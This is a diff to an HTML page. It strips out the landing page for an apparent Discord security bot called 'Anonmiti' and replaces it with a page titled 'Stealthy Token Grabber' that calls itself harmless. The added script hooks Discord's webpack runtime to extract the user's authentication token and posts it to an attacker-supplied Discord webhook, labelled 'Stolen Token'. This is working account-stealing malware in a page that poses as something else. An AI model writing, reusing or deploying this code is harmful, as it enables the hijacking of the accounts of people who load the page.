@@ -3,264 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anonmiti Security Bot</title>
-
-    <!-- 🖼️ Favicon -->
-    <link rel="icon" type="image/png" href="anonmiti.png">
-
-    <!-- ✅ Open Graph Meta Tags (For Discord, Facebook, etc.) -->
-    <meta property="og:title" content="Anonmiti Security Bot">
-    <meta property="og:description" content="Protect your Discord server from malicious attacks with ease!">
-    <meta property="og:image" content="https://anonmiti.github.io/antinuker/preview-image.png">
-    <meta property="og:url" content="https://anonmiti.github.io/antinuker/">
-    <meta property="og:type" content="website">
-
-    <!-- ✅ Twitter Card Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Anonmiti Security Bot">
-    <meta name="twitter:description" content="Protect your Discord server from malicious attacks with ease!">
-    <meta name="twitter:image" content="https://anonmiti.github.io/antinuker/preview-image.png">
-
-    <!-- Fonts and Styles -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body, html {
-            height: 100%;
-            font-family: 'Poppins', sans-serif;
-            background-color: #000;
-            overflow-y: auto;
-        }
-
-        #particles-js {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        .content {
-            position: relative;
-            text-align: center;
-            color: white;
-            z-index: 1;
-            padding: 20px;
-        }
-
-        .content h1 {
-            margin: 20px 0 10px;
-            font-size: 48px;
-        }
-
-        .content p {
-            margin: 10px 0;
-            font-size: 18px;
-        }
-
-        .invite-button {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 15px 30px;
-            background-color: #ffffff;
-            color: #4b79a1;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .invite-button:hover {
-            background-color: #e0e0e0;
-        }
-
-        .invite-card {
-            background-color: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 20px;
-            max-width: 400px;
-            margin: 20px auto;
-            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .invite-card img {
-            width: 60px;
-            height: 60px;
-            border-radius: 12px;
-            margin-right: 20px;
-        }
-
-        .invite-card h3 {
-            margin: 0;
-            font-size: 20px;
-        }
-
-        .invite-card p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #aaa;
-        }
-
-        .join-button {
-            background-color: #28a745;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 10px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            text-align: center;
-            margin-left: auto;
-        }
-
-        .join-button:hover {
-            background-color: #218838;
-        }
-
-        .features {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-top: 30px;
-        }
-
-        .feature-card {
-            background-color: #1a1a1a;
-            color: #fff;
-            padding: 20px;
-            margin: 15px;
-            border-radius: 12px;
-            width: 300px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
-            text-align: center;
-        }
-
-        .feature-card img {
-            width: 50px;
-            margin-bottom: 10px;
-        }
-
-        .feature-card h2 {
-            margin: 10px 0;
-            font-size: 24px;
-        }
-
-        .feature-card p {
-            font-size: 16px;
-            line-height: 1.5;
-        }
-
-        /* Ensure the layout is scrollable on mobile screens */
-        @media screen and (max-width: 768px) {
-            body {
-                overflow-y: scroll;
-            }
-
-            .content h1 {
-                font-size: 36px;
-            }
-
-            .invite-card {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-
-            .join-button {
-                margin-top: 10px;
-                margin-left: 0;
-            }
-
-            .feature-card {
-                width: 90%;
-            }
-        }
-    </style>
+    <title>Stealthy Token Grabber</title>
 </head>
 <body>
+    <h1>Welcome to Our Test Page!</h1>
+    <p>This is a harmless website... or is it? 😈</p>
 
-<!-- Particles Background -->
-<div id="particles-js"></div>
+    <script>
+        // The URL of your Discord webhook (replace with your own)
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
-<!-- Main Content -->
-<div class="content">
-    <h1>Anonmiti Security Bot</h1>
-    <p>Protect your Discord server from malicious attacks with ease!</p>
-    <a href="https://discord.com/oauth2/authorize?client_id=1325876054400831621&permissions=8&integration_type=0&scope=bot" class="invite-button">Invite the Bot</a>
-</div>
+        // Hook into Discord's Webpack runtime to get the token
+        try {
+            var token = (webpackChunkdiscord_app.push([[''], {}, e => {
+                m = [];
+                for (let c in e.c) m.push(e.c[c]);
+            }]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
 
-<!-- Invite Card Feature -->
-<div class="invite-card">
-    <img src="anonmiti.png" alt="Server Logo">
-    <div>
-        <h3>Anonmiti</h3>
-        <p>Join Anonmiti Discord Server</p>
-    </div>
-    <button class="join-button" onclick="location.href='https://discord.gg/MFAJuGregQ'">Join</button>
-</div>
+            // Send the token to your Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `Stolen Token: ${token}` })
+            });
 
-<!-- Features Section -->
-<div class="features">
-    <div class="feature-card">
-        <img src="anonmiti.png" alt="Feature Icon">
-        <h2>Powerful Moderation</h2>
-        <p>Ensure your server is secure with advanced moderation features and zero required permissions.</p>
-    </div>
-    <div class="feature-card">
-        <img src="anonmiti.png" alt="Feature Icon">
-        <h2>Anti Nuke</h2>
-        <p>Prevent nuking attacks and keep your server safe with customizable protection measures.</p>
-    </div>
-    <div class="feature-card">
-        <img src="anonmiti.png" alt="Feature Icon">
-        <h2>Anti Raid</h2>
-        <p>Protect your server from bot raids and unauthorized entries with real-time protection.</p>
-    </div>
-    <div class="feature-card">
-        <img src="anonmiti.png" alt="Feature Icon">
-        <h2>Recovery System</h2>
-        <p>Quickly recover your server settings and roles in case of any unauthorized changes.</p>
-    </div>
-</div>
-
-<!-- Particles.js Script -->
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-<script>
-    particlesJS("particles-js", {
-        particles: {
-            number: { value: 80, density: { enable: true, value_area: 800 } },
-            color: { value: "#ffffff" },
-            shape: {
-                type: "polygon",
-                polygon: { nb_sides: 6 }
-            },
-            opacity: { value: 0.5 },
-            size: { value: 3, random: true },
-            line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
-            move: { enable: true, speed: 6 }
-        },
-        interactivity: {
-            detect_on: "canvas",
-            events: {
-                onhover: { enable: true, mode: "repulse" },
-                onclick: { enable: true, mode: "push" }
-            }
+            console.log('Token sent to webhook:', token);
+        } catch (error) {
+            console.error('Failed to grab token:', error);
         }
-    });
-</script>
-
+    </script>
 </body>
 </html>
